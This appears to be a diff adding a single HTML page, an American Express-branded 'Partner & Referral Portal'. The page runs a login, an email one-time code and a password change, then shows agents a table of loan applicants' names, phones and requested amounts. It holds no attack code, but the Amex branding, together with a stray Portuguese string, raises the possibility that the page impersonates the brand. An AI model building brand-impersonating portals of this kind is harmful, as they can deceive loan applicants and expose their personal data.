@@ -1,0 +1,504 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="referrer" content="no-referrer" />
+  <title>American Express — Partner & Referral Portal</title>
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <style>
+    :root {
+      color-scheme: light;
+      --amex-blue: #006FCF;
+      --amex-blue-hover: #0056A3;
+      --amex-navy: #002663;
+      --amex-dark-navy: #00175A;
+      --amex-ice: #E8F1FC;
+      --ink: #1F2937;
+      --muted: #4B5563;
+      --line: #E5E7EB;
+      --card-bg: #FFFFFF;
+      --bg: #F4F6F8;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: var(--bg);
+      color: var(--ink);
+      font: 15px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+    header {
+      padding: 14px max(24px, calc((100vw - 1040px) / 2));
+      background: var(--amex-navy);
+      color: white;
+      border-bottom: 3px solid var(--amex-blue);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 2px 10px rgba(0, 38, 99, 0.2);
+    }
+    header strong {
+      font: 700 17px/1.2 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      letter-spacing: -0.01em;
+    }
+    .header-tag {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      background: rgba(255, 255, 255, 0.15);
+      padding: 3px 8px;
+      border-radius: 4px;
+      border: 1px solid rgba(255, 255, 255, 0.25);
+    }
+    main {
+      width: min(100% - 32px, 1040px);
+      margin: 36px auto 60px;
+    }
+    h1 {
+      color: var(--amex-navy);
+      font: 800 28px/1.2 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      margin: 0 0 8px;
+      letter-spacing: -0.02em;
+    }
+    p.intro {
+      margin: 0 0 24px;
+      color: var(--muted);
+      font-size: 14px;
+    }
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      box-shadow: 0 4px 16px -2px rgba(0, 38, 99, 0.06);
+      padding: 24px;
+    }
+    form {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 12px;
+      align-items: end;
+      background: white;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 4px 16px -2px rgba(0, 38, 99, 0.06);
+    }
+    label {
+      grid-column: 1 / -1;
+      font-weight: 700;
+      font-size: 13px;
+      color: var(--amex-navy);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-top: 6px;
+    }
+    input {
+      width: 100%;
+      min-height: 46px;
+      padding: 10px 14px;
+      border: 1.5px solid var(--line);
+      border-radius: 8px;
+      font-size: 15px;
+      background: #F9FAFB;
+      transition: all 0.15s ease;
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--amex-blue);
+      background: #FFFFFF;
+      box-shadow: 0 0 0 3px rgba(0, 111, 207, 0.18);
+    }
+    button {
+      min-height: 46px;
+      border: 0;
+      border-radius: 8px;
+      padding: 0 24px;
+      background: var(--amex-blue);
+      color: white;
+      font-weight: 700;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 2px 6px rgba(0, 111, 207, 0.3);
+    }
+    button:hover {
+      background: var(--amex-blue-hover);
+      box-shadow: 0 4px 12px rgba(0, 111, 207, 0.35);
+    }
+    button:active {
+      transform: translateY(1px);
+    }
+    button:disabled {
+      opacity: .55;
+      cursor: wait;
+    }
+    button.secondary {
+      background: #E5E7EB;
+      color: #374151;
+      box-shadow: none;
+    }
+    button.secondary:hover {
+      background: #D1D5DB;
+    }
+    .language-toggle {
+      min-width: 44px;
+      min-height: 34px;
+      border: 1px solid rgba(255,255,255,.4);
+      border-radius: 6px;
+      background: rgba(255,255,255,.1);
+      color: white;
+      font-weight: 700;
+      font-size: 12px;
+      cursor: pointer;
+    }
+    .language-toggle:hover {
+      background: rgba(255,255,255,.2);
+    }
+    .message {
+      min-height: 22px;
+      margin: 14px 0;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--muted);
+    }
+    [hidden] {
+      display: none !important;
+    }
+    .error {
+      color: #DC2626;
+      background: #FEE2E2;
+      padding: 10px 14px;
+      border-radius: 8px;
+      border: 1px solid #FCA5A5;
+    }
+    .table-wrap {
+      overflow-x: auto;
+      background: white;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      box-shadow: 0 4px 16px -2px rgba(0, 38, 99, 0.06);
+      margin-top: 16px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 13.5px;
+    }
+    th, td {
+      padding: 13px 16px;
+      border-bottom: 1px solid var(--line);
+      vertical-align: middle;
+    }
+    th {
+      color: var(--amex-navy);
+      background: #F8FAFC;
+      font-size: 11.5px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    tr:last-child td {
+      border-bottom: none;
+    }
+    tr:hover td {
+      background: #F9FAFB;
+    }
+    .dashboard-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      padding: 3px 9px;
+      border-radius: 9999px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    .badge.green { background: #ECFDF5; color: #047857; border: 1px solid #A7F3D0; }
+    .badge.blue { background: #EFF6FF; color: #1D4ED8; border: 1px solid #BFDBFE; }
+    .badge.yellow { background: #FEF3C7; color: #B45309; border: 1px solid #FDE68A; }
+    .badge.red { background: #FEF2F2; color: #B91C1C; border: 1px solid #FECACA; }
+    @media (max-width: 640px) {
+      main { margin-top: 24px; }
+      h1 { font-size: 24px; }
+      form { grid-template-columns: 1fr; }
+      label { grid-column: auto; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <strong style="display:flex;align-items:center;gap:12px;">
+      <img src="/amex_logo_white.svg" style="height:28px;" alt="American Express" />
+      <span>American Express Partner & Referral Portal</span>
+    </strong>
+    <button class="language-toggle" type="button">EN</button>
+  </header>
+  <main>
+    <h1>Partner Referral Applications</h1>
+    <p id="introText" class="intro">Sign in with your partner credentials. Only authorized applicant referrals are displayed.</p>
+
+    <form id="loginForm">
+      <label for="username">Partner Username</label>
+      <input id="username" autocomplete="username" placeholder="e.g. partner_agent" required />
+      <label for="password">Password</label>
+      <input id="password" type="password" autocomplete="current-password" placeholder="••••••••••••" required />
+      <button id="loginButton" type="submit">Sign In</button>
+    </form>
+
+    <form id="otpForm" hidden>
+      <p id="otpDelivery" aria-live="polite" style="grid-column: 1 / -1; margin: 0; font-size: 13px; color: var(--muted);"></p>
+      <label for="otpCode">Security Code Sent via Email</label>
+      <input id="otpCode" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" autocomplete="one-time-code" placeholder="6-digit code" required />
+      <button id="verifyOtpButton" type="submit">Verify Code</button>
+    </form>
+
+    <form id="passwordForm" hidden>
+      <label for="currentPassword">Current Temporary Password</label>
+      <input id="currentPassword" type="password" autocomplete="current-password" required />
+      <label for="newPassword">New Password (Minimum 12 Characters)</label>
+      <input id="newPassword" type="password" minlength="12" maxlength="128" autocomplete="new-password" required />
+      <label for="confirmPassword">Confirm New Password</label>
+      <input id="confirmPassword" type="password" minlength="12" maxlength="128" autocomplete="new-password" required />
+      <button id="changePasswordButton" type="submit">Update Password</button>
+    </form>
+
+    <section id="dashboard" hidden>
+      <div class="dashboard-bar">
+        <p id="leadCount" class="message" role="status" style="margin: 0; font-size: 16px; font-weight: 700; color: var(--amex-navy);"></p>
+        <button id="logoutButton" type="button" class="secondary" style="min-height: 38px; padding: 0 16px; font-size: 13px;">Sign Out</button>
+      </div>
+    </section>
+
+    <div class="message" id="message" role="status" aria-live="polite"></div>
+
+    <div class="table-wrap" id="leadTable" hidden>
+      <table>
+        <thead>
+          <tr>
+            <th>Date</th>
+            <th>Applicant</th>
+            <th>Phone</th>
+            <th>Loan Product</th>
+            <th>Requested Amount</th>
+            <th>Term</th>
+            <th>Underwriting Stage</th>
+          </tr>
+        </thead>
+        <tbody id="leadRows"></tbody>
+      </table>
+    </div>
+  </main>
+
+  <script src="/language.js"></script>
+  <script>
+    window.t = window.t || function(key) { return key; };
+    const form = document.getElementById('loginForm');
+    const otpForm = document.getElementById('otpForm');
+    const passwordForm = document.getElementById('passwordForm');
+    const dashboard = document.getElementById('dashboard');
+    const leadTable = document.getElementById('leadTable');
+    const rows = document.getElementById('leadRows');
+    const formatter = new Intl.NumberFormat('en-US');
+    const message = document.getElementById('message');
+    let otpChallengeToken = '';
+
+    function showMessage(text, error = false) {
+      message.textContent = window.t(text);
+      message.className = error ? 'message error' : 'message';
+    }
+
+    async function loadLeads() {
+      const response = await fetch('/api/agent/leads');
+      const data = await response.json();
+      if (!response.ok) throw new Error(data.error || 'Could not load referral applications.');
+      rows.replaceChildren();
+      for (const lead of data.leads) {
+        const row = document.createElement('tr');
+        const stage = (lead.status || 'pending').toLowerCase();
+        let stageLabel = 'Pending';
+        let badgeClass = 'yellow';
+        if (stage === 'under_review') { stageLabel = 'Under Review'; badgeClass = 'blue'; }
+        else if (stage === 'approved') { stageLabel = 'Approved'; badgeClass = 'green'; }
+        else if (stage === 'rejected') { stageLabel = 'Rejected'; badgeClass = 'red'; }
+
+        const values = [
+          new Date(`${lead.created_at}Z`).toLocaleString('en-US'),
+          `${lead.first_name} ${lead.last_name}`,
+          String(lead.phone).startsWith('+') ? lead.phone : `+${lead.phone}`,
+          lead.loan_type,
+          `$${formatter.format(lead.loan_amount)} USD`,
+          `${lead.term_months} Months`,
+          `<span class="badge ${badgeClass}">${window.t(stageLabel)}</span>`
+        ];
+        
+        values.forEach((val, idx) => {
+          const cell = document.createElement('td');
+          if (idx === 6) {
+            cell.innerHTML = val;
+          } else {
+            cell.textContent = val;
+          }
+          row.append(cell);
+        });
+        rows.append(row);
+      }
+      document.getElementById('leadCount').textContent = `${data.leads.length} ${window.t('candidatura(s).')}`;
+      leadTable.hidden = false;
+      dashboard.hidden = false;
+      form.hidden = true;
+      passwordForm.hidden = true;
+    }
+
+    async function checkExistingSession() {
+      try {
+        const response = await fetch('/api/agent/me');
+        if (!response.ok) return;
+        const session = await response.json();
+        if (session.mustChangePassword) {
+          form.hidden = true;
+          passwordForm.hidden = false;
+          showMessage('Temporary password change required before accessing the referral portal.');
+          return;
+        }
+        await loadLeads();
+      } catch (error) {
+        showMessage(error.message || 'Could not load applications.', true);
+      }
+    }
+
+    form.addEventListener('submit', async event => {
+      event.preventDefault();
+      const loginButton = document.getElementById('loginButton');
+      loginButton.disabled = true;
+      try {
+        const response = await fetch('/api/agent/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: document.getElementById('username').value.trim(),
+            password: document.getElementById('password').value
+          })
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Invalid username or password');
+        form.hidden = true;
+        if (data.otpRequired) {
+          otpChallengeToken = data.challengeToken;
+          document.getElementById('otpDelivery').textContent = `Security code sent to ${data.maskedEmail}`;
+          otpForm.hidden = false;
+          showMessage('Enter the 6-digit verification code sent to your email.');
+        } else if (data.mustChangePassword) {
+          passwordForm.hidden = false;
+          document.getElementById('currentPassword').value = document.getElementById('password').value;
+          showMessage('Please update your temporary password to proceed.');
+        } else {
+          await loadLeads();
+          showMessage('');
+        }
+      } catch (error) {
+        form.hidden = false;
+        showMessage(error.message || 'Connection error.', true);
+      } finally {
+        loginButton.disabled = false;
+      }
+    });
+
+    otpForm.addEventListener('submit', async event => {
+      event.preventDefault();
+      const button = document.getElementById('verifyOtpButton');
+      button.disabled = true;
+      try {
+        const response = await fetch('/api/agent/verify-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            challengeToken: otpChallengeToken,
+            code: document.getElementById('otpCode').value.trim()
+          })
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Invalid security code.');
+        otpForm.hidden = true;
+        otpChallengeToken = '';
+        if (data.mustChangePassword) {
+          passwordForm.hidden = false;
+          document.getElementById('currentPassword').value = document.getElementById('password').value;
+          showMessage('Please update your temporary password to proceed.');
+        } else {
+          await loadLeads();
+          showMessage('');
+        }
+      } catch (error) {
+        showMessage(error.message || 'Verification failed.', true);
+      } finally {
+        button.disabled = false;
+      }
+    });
+
+    passwordForm.addEventListener('submit', async event => {
+      event.preventDefault();
+      const newPassword = document.getElementById('newPassword').value;
+      const confirmPassword = document.getElementById('confirmPassword').value;
+      if (newPassword !== confirmPassword) {
+        showMessage('Passwords do not match.', true);
+        return;
+      }
+      const button = document.getElementById('changePasswordButton');
+      button.disabled = true;
+      try {
+        const response = await fetch('/api/agent/password', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            currentPassword: document.getElementById('currentPassword').value,
+            newPassword
+          })
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Could not change password');
+        document.getElementById('password').value = newPassword;
+        document.getElementById('currentPassword').value = newPassword;
+        document.getElementById('newPassword').value = '';
+        document.getElementById('confirmPassword').value = '';
+        await loadLeads();
+        showMessage('Password successfully updated.');
+      } catch (error) {
+        showMessage(error.message || 'Could not update password.', true);
+      } finally {
+        button.disabled = false;
+      }
+    });
+
+    document.getElementById('logoutButton').addEventListener('click', async () => {
+      await fetch('/api/agent/logout', { method: 'POST' });
+      dashboard.hidden = true;
+      leadTable.hidden = true;
+      form.hidden = false;
+      document.getElementById('password').value = '';
+      showMessage('Signed out.');
+    });
+
+    checkExistingSession();
+  </script>
+</body>
+</html>
